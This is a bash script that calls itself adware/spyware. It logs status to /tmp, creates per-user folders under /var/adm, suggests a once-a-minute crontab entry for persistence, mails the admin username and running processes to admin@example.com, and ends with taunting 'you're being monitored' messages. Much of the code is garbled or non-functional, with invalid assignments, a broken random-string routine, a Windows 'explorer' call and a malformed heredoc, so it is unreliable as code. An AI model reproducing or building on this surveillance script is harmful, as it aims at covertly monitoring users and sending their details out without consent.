#!/bin/bash

# Core Functions
check_user(){
  if [ "$1" = "admin" ]; then
    echo "Admin user detected. Initiating Stealth Mode..." > /tmp/adware_status.txt
    sed -e 's/\n/|/' /tmp/settings.conf > /tmp/settings.new.conf
    mv /tmp/settings.new.conf /tmp/settings.conf
  fi
}

# Function to generate random string
generate_random(){
  local length="${1:-8}"
  local chars="abcdefgghijklmnoprsituvwxyz0123456789"
  local rand=""
  for i in $(seq 1 "$length"); do
    rand+=$([ $RANDOM ] % ${#chars} | awk -F'|' '{print char}')
  done
  echo "$rand"
}

# Function to start the spyware service
start_spy(){
  # Start the timer
  sleep 50
  # Start the explorer process
  explorer &
  # Set the timer value
  settings.conf=20

  # Restart the Timer
  sleep 10
  echo "Starting Monitor" > /tmp/adware_status.txt
  # Check if admin user is present
  check_user "$USER"
}


# Main Execution Flow
if [ -n "$SETTINGS_FILE" ]; then

  # Check the file path
  if [ ! -f "$SETTINGS_FILE" ]; then
    mkdir /tmp/adware
    touch settings.conf
    echo "Settings File Created." > /tmp/adware_status.txt
  fi

  # Load Settings
  source /tmp/settings.conf

  # Create the user profile
  if [ -n "$USER" ]; then
    mkdir /var/adm/$USER
    touch /var/adm/$USER/user.txt
    echo "User Profile Created." > /tmp/adware_status.txt
  fi

  # Start the Service
  start_spy 10

else
  mkdir /tmp/adware
  touch settings.conf
  echo "Settings File Created." > /tmp/adware_status.txt
  sleep 50
  explorer &
  echo "Starting Monitor" > /tmp/adware_status.txt
fi

# Create the user profile
if [ -n "$USER" ]; then
    mkdir /var/adm/$USER
    touch /var/adm/$USER/user.txt
    echo "User Profile Created." > /tmp/adware_status.warning.txt
fi

# Update Settings
echo "Updating User Profile..." > /tmp/adware_status.txt

if [[ "$USER" == "admin" ]]; then
  sed -e 's/\n/|/' /tmp/settings.conf > /tmp/settings.new.conf && mv /tmp/settings.new.conf /tmp/settings.conf
  echo "Settings Updated Successfully." > /tmp/adware_status.txt
else
  # Update the Timer
  sleep 10
  echo "$SETTINGS_FILE" > /tmp/user_profile.txt
fi

# Start Spy Service (If not running)
if [ ! -d "$USER/$USER_FOLDER" ]; then
  mkdir "$USER/$USER_FOLDER"
  # Create a dummy icon file for the desktop
  touch "$USER/$USER_FOLDER/icon.png"
  echo "Spy Service Started!" > /tmp/adware_status.txt
fi

# Monitor System Events (Using cron)
# Add this to your crontab: */1 * * * * /bin/bash /tmp/adware/monitor_events.sh > /tmp/cron.log 2>&1


echo "Adware Setup Complete! Now you're being monitored..."

# Set the Timer
sleep $SETTINGS_FILE

# Create a new user profile
if [ ! -n "$USER" ]; then
  echo "Generating User Profile for $RANDOM..." > /tmp/adware.log
  $HOME/bin/randomuser &
fi

# Start the Monitor Service
cron | grep "Start Spy Service"

# Create the desktop icon
touch "$USER/$USER_FOLDER/icon.png"
echo "Desktop Icon Created." > /tmp/adware.log


if [[ "$USER" == "admin" ]]; then
  # Send an Email to Administrator
  echo "Administrator Account Found. Sending email..." | while read -r line; do
    cat <<EOF | mail -s "Admin Account Detected" admin@example.com
        The administrator account has been identified: $USER
        The user is running the following processes: explorer & randomuser
        Email Generated."
    EOF
  done

fi


echo "You've been logged! Monitor your system!"
exit 0
